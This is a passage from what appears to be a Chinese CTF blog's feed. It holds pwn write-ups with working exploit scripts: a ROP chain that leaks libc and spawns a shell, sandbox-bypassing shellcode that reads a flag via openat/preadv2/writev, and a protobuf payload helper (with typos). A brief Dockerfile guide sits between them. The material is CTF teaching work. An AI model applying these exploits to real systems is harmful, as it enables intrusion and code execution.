punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token keyword\">finally</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Found libc address: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>rc<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>system <span class=\"token operator\">=</span> libc_addr <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>binsh <span class=\"token operator\">=</span> libc_addr <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>r15 <span class=\"token operator\">=</span><span class=\"token number\">0x0000000000023b69</span><span class=\"token operator\">+</span>libc_addr</pre></td></tr><tr><td data-num=\"68\"></td><td><pre>rdx <span class=\"token operator\">=</span><span class=\"token number\">0x0000000000142c92</span><span class=\"token operator\">+</span>libc_addr</pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>ogg <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0xe3afe</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xe3b01</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xe3b04</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token operator\">//</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>r15<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdx<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ogg<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>libc_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>se<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><img data-src=\"/img/春秋杯夏季赛/image-20240706172123978.png\" alt=\"image-20240706172123978\" style=\"zoom: 67%;\" />\n<h3 id=\"shuffled_execution\"><a class=\"markdownIt-Anchor\" href=\"#shuffled_execution\">#</a> Shuffled_Execution</h3>\n<img data-src=\"/img/春秋杯夏季赛/image-20240706172247612.png\" alt=\"image-20240706172247612\" style=\"zoom:67%;\" />\n<p>程序开启了沙盒</p>\n<img data-src=\"/img/春秋杯夏季赛/image-20240706172333749.png\" alt=\"image-20240706172333749\" style=\"zoom:80%;\" />\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>host<span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token string\">\"39.106.48.123:24059\"</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># r = process('./pwn')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length             <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>pay <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"\"\"</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>/* openat */</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>mov rsp,0x1337500</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>mov rax,0x00000067616c662f;</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>push rax;</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>push rsp;</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>pop rsi;</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>xor rdi,rdi;</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>xor rdx,rdx;</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>push 0x101;</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>pop rax;</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>syscall;</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>/* ioc */</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>push 0x70; </pre></td></tr><tr><td data-num=\"40\"></td><td><pre>push rsp;pop rax;inc ah;push rax;push rsp;pop r15;</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>/* preadv2 */</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>push 3;</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>pop rdi;</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>push r15;</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>pop rsi;</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>push 1;</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>pop rdx;</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>push 0;</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>pop r10;</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>push 0;</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>pop r8;</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>push 327;</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>pop rax;</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>syscall;</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>/* dup2 */</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>push 1;</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>pop rdi;</pre></td></tr><tr><td data-num=\"58\"></td><td><pre>push 1001;</pre></td></tr><tr><td data-num=\"59\"></td><td><pre>pop rsi;</pre></td></tr><tr><td data-num=\"60\"></td><td><pre>push 33;</pre></td></tr><tr><td data-num=\"61\"></td><td><pre>pop rax;</pre></td></tr><tr><td data-num=\"62\"></td><td><pre>syscall;</pre></td></tr><tr><td data-num=\"63\"></td><td><pre>/* writev */</pre></td></tr><tr><td data-num=\"64\"></td><td><pre>push rsi;</pre></td></tr><tr><td data-num=\"65\"></td><td><pre>pop rdi;</pre></td></tr><tr><td data-num=\"66\"></td><td><pre>push r15;</pre></td></tr><tr><td data-num=\"67\"></td><td><pre>pop rsi;</pre></td></tr><tr><td data-num=\"68\"></td><td><pre>push 1;</pre></td></tr><tr><td data-num=\"69\"></td><td><pre>pop rdx;</pre></td></tr><tr><td data-num=\"70\"></td><td><pre>push 20;</pre></td></tr><tr><td data-num=\"71\"></td><td><pre>pop rax;</pre></td></tr><tr><td data-num=\"72\"></td><td><pre>syscall;</pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\"\"\"</span></span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>se<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span>pay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><img data-src=\"/img/春秋杯夏季赛/image-20240706172852649.png\" alt=\"image-20240706172852649\" style=\"zoom:80%;\" />\n<h3 id=\"simplesys\"><a class=\"markdownIt-Anchor\" href=\"#simplesys\">#</a> simpleSys</h3>\n<p>fix</p>\n<p><img data-src=\"/img/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706173124375.png\" alt=\"image-20240706173124375\"></p>\n",
            "tags": [
                "Game"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/07/03/Dockerfile%E4%B9%A6%E5%86%99%E8%A7%84%E8%8C%83/",
            "url": "https://yhuanhuan01.github.io/2024/07/03/Dockerfile%E4%B9%A6%E5%86%99%E8%A7%84%E8%8C%83/",
            "title": "Dockerfile书写规范",
            "date_published": "2024-07-03T02:19:52.000Z",
            "content_html": "<h1 id=\"dockerfile书写规范\"><a class=\"markdownIt-Anchor\" href=\"#dockerfile书写规范\">#</a> Dockerfile 书写规范</h1>\n<blockquote>\n<p>dockerfile 书写目的</p>\n</blockquote>\n<p>尽量构建的镜像尽可能小，提高部署速度，提高效率。</p>\n<blockquote>\n<p>dockerfile 书写格式</p>\n</blockquote>\n<h4 id=\"from\"><a class=\"markdownIt-Anchor\" href=\"#from\">#</a> FROM</h4>\n<p>指定基础镜像，若想去搭建 ubuntu22.04 镜像。则格式应为下面</p>\n<blockquote>\n<p>FROM ubuntu:22.04</p>\n</blockquote>\n<h4 id=\"run\"><a class=\"markdownIt-Anchor\" href=\"#run\">#</a> RUN</h4>\n<blockquote>\n<p>在镜像中执行命令，通常用于安装软件或配置环境。</p>\n</blockquote>\n<h4 id=\"cmd\"><a class=\"markdownIt-Anchor\" href=\"#cmd\">#</a> CMD</h4>\n<blockquote>\n<p>容器启动时执行的命令。通常写入 <code>.sh</code>  文件内</p>\n</blockquote>\n<h4 id=\"label\"><a class=\"markdownIt-Anchor\" href=\"#label\">#</a> LABEL</h4>\n<blockquote>\n<p>为镜像添加元数据标签。</p>\n</blockquote>\n<h4 id=\"env\"><a class=\"markdownIt-Anchor\" href=\"#env\">#</a> ENV</h4>\n<blockquote>\n<p>设置环境变量。</p>\n</blockquote>\n<h4 id=\"copy\"><a class=\"markdownIt-Anchor\" href=\"#copy\">#</a> COPY</h4>\n<blockquote>\n<p>将本地文件或目录复制到镜像中。</p>\n<p>如果想要持久保留化，配合 RUN cp filename 保留在容器内，否则 COPY 完之后，开启容器是就会自动销毁</p>\n</blockquote>\n<h4 id=\"add\"><a class=\"markdownIt-Anchor\" href=\"#add\">#</a> ADD</h4>\n<blockquote>\n<p>类似于 COPY，但支持从 URL 下载文件。</p>\n</blockquote>\n<h4 id=\"volume\"><a class=\"markdownIt-Anchor\" href=\"#volume\">#</a> VOLUME</h4>\n<blockquote>\n<p>创建一个挂载点，用于数据持久化。</p>\n</blockquote>\n<h4 id=\"expose\"><a class=\"markdownIt-Anchor\" href=\"#expose\">#</a> EXPOSE</h4>\n<blockquote>\n<p>指定容器运行时监听的端口。</p>\n</blockquote>\n<h4 id=\"workdir\"><a class=\"markdownIt-Anchor\" href=\"#workdir\">#</a> WORKDIR</h4>\n<blockquote>\n<p>设置容器的工作目录。</p>\n</blockquote>\n",
            "tags": [
                "技巧"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/06/28/protocol%E5%AD%A6%E4%B9%A0/",
            "url": "https://yhuanhuan01.github.io/2024/06/28/protocol%E5%AD%A6%E4%B9%A0/",
            "title": "protocol学习",
            "date_published": "2024-06-28T03:10:40.000Z",
            "content_html": "<h1 id=\"protocol\"><a class=\"markdownIt-Anchor\" href=\"#protocol\">#</a> protocol</h1>\n<blockquote>\n<p>前言：</p>\n<p>华中赛区题目，第一次，由此记录一下</p>\n</blockquote>\n<p>文档：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wcm90b2J1Zi5kZXYvb3ZlcnZpZXcv\">https://protobuf.dev/overview/</span></p>\n<p>如何去还原此结构：</p>\n<p>我的方案如下</p>\n<blockquote>\n<p>git clone <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21hcmluLW0vcGJ0ay5naXQ=\">https://github.com/marin-m/pbtk.git</span></p>\n<p>sudo apt install protobuf-compiler</p>\n</blockquote>\n<p>先进行必要的安装配置</p>\n<p>接下来去生成导入的 py 包</p>\n<blockquote>\n<p>./extractors/from_binary.py ./pwn</p>\n<p>protoc --python_out=. ./filename.proto</p>\n</blockquote>\n<p><img data-src=\"/img/protocol/image-20240628092648137.png\" alt=\"image-20240628092648137\"></p>\n<p>即可得到上面文件</p>\n<h2 id=\"题目启动\"><a class=\"markdownIt-Anchor\" href=\"#题目启动\">#</a> 题目启动</h2>\n<h3 id=\"检查保护\"><a class=\"markdownIt-Anchor\" href=\"#检查保护\">#</a> 检查保护</h3>\n<p><img data-src=\"/img/protocol/image-20240628093304459.png\" alt=\"image-20240628093304459\"></p>\n<p>运行一波程序看看咋样</p>\n<p><img data-src=\"/img/protocol/image-20240628093431819.png\" alt=\"image-20240628093431819\"></p>\n<h3 id=\"测试\"><a class=\"markdownIt-Anchor\" href=\"#测试\">#</a> 测试</h3>\n<p>输入会输出这个，去定位一下</p>\n<p><img data-src=\"/img/protocol/image-20240628093536176.png\" alt=\"image-20240628093536176\"></p>\n<p>if 判断 v5 是否返回 1，返回 0 则会输出 <code>Protobuf Parse Error!</code></p>\n<p><img data-src=\"/img/protocol/image-20240628093750454.png\" alt=\"image-20240628093750454\"></p>\n<p>可以发现，我们 v6 向 s 所在地址去输入，而 v5 所指向的函数应该是检测 s 地址内容的函数</p>\n<p>GPT 解释如下</p>\n<p><code>google::protobuf::MessageLite::ParseFromArray</code>  是 Google Protocol Buffers (protobuf) 库中用于解析二进制数据的方法。它从给定的字节数组中解析数据并将其填充到相应的 protobuf 消息中。</p>\n<p>让我们分解一下这个函数调用：</p>\n<pre><code class=\"language-c++\">google::protobuf::MessageLite::ParseFromArray((google::protobuf::MessageLite *)&amp;unk_209080, s, v6);\n</code></pre>\n<ul>\n<li>\n<p><code>google::protobuf::MessageLite</code>  是一个抽象基类，它定义了所有 protobuf 消息的基本接口和操作。 <code>ParseFromArray</code>  是这个类中的一个成员函数。</p>\n</li>\n<li>\n<p><code>ParseFromArray</code>  函数的签名通常是这样的：</p>\n<pre><code class=\"language-c++\">bool ParseFromArray(const void* data, int size);\n</code></pre>\n<p>它从一个给定大小的字节数组 ( <code>data</code>  开始，大小为  <code>size</code> ) 中解析 protobuf 消息。</p>\n</li>\n<li>\n<p>在这个调用中：</p>\n<ul>\n<li><code>(google::protobuf::MessageLite *)&amp;unk_209080</code>  是一个指向  <code>google::protobuf::MessageLite</code>  派生类实例的指针，表示要将解析得到的数据填充到  <code>unk_209080</code>  对象中。</li>\n<li><code>s</code>  是一个指向字节数组的指针，表示数据来源。</li>\n<li><code>v6</code>  是一个整数，表示字节数组的大小（即  <code>s</code>  的长度）。</li>\n</ul>\n</li>\n</ul>\n<p>换句话说，这个函数调用试图从字节数组  <code>s</code>  中读取  <code>v6</code>  个字节，并将解析得到的消息存储到  <code>unk_209080</code>  对象中。</p>\n<p>如果解析成功， <code>ParseFromArray</code>  将返回  <code>true</code> ；如果失败，则返回  <code>false</code> 。通常情况下，失败的原因可能包括数据格式不正确或数组长度不够等。</p>\n<p>所以如果我们解析失败则不去往下去执行</p>\n<p>unk_209080 填充数据地方只有 1bit 大小空间</p>\n<p><img data-src=\"/img/protocol/image-20240628095136822.png\" alt=\"image-20240628095136822\"></p>\n<p>我们很难进行自己去输入测试</p>\n<p>看下结构体</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>message protoMessage <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    optional string name <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    optional string phoneNumber <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    required <span class=\"token builtin\">bytes</span> <span class=\"token builtin\">buffer</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    required uint32 size <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>optional 可选项</p>\n<p>required 需要写入</p>\n<blockquote>\n<p>封装函数</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">send_payload</span><span class=\"token punctuation\">(</span> buf<span class=\"token punctuation\">,</span> szie<span class=\"token punctuation\">,</span> name <span class=\"token operator\">=</span> <span class=\"token string\">b'name'</span><span class=\"token punctuation\">,</span> phoneNumber <span class=\"token operator\">=</span> <span class=\"token string\">b'phoneNumber'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tpl <span class=\"token operator\">=</span> message_pb2<span class=\"token punctuation\">.</span>protoMessage<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span><span class=\"token builtin\">buffer</span> <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">return</span> pl<span class=\"token punctuation\">.</span>SerializeToString<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> message_pb2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>message protoMessage &#123;</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    optional string name = 1;</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    optional string phoneNumber = 2;</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    required bytes buffer = 3;</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    required uint32 size = 4;</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>&#125;</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">set_payload</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> szie<span class=\"token punctuation\">,</span> name <span class=\"token operator\">=</span> <span class=\"token string\">b'name'</span><span class=\"token punctuation\">,</span> phoneNumber <span class=\"token operator\">=</span> <span class=\"token string\">b'phoneNumber'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tpl <span class=\"token operator\">=</span> message_pb2<span class=\"token punctuation\">.</span>protoMessage<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>phoneNumber <span class=\"token operator\">=</span> phoneNumber</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span><span class=\"token builtin\">buffer</span> <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> size</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token keyword\">return</span> pl<span class=\"token punctuation\">.</span>SerializeToString<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>buf <span class=\"token operator\">=</span> <span class=\"token string\">b'aaaa'</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>size <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>payload <span class=\"token operator\">=</span> set_payload<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/protocol/image-20240628102847682.png\" 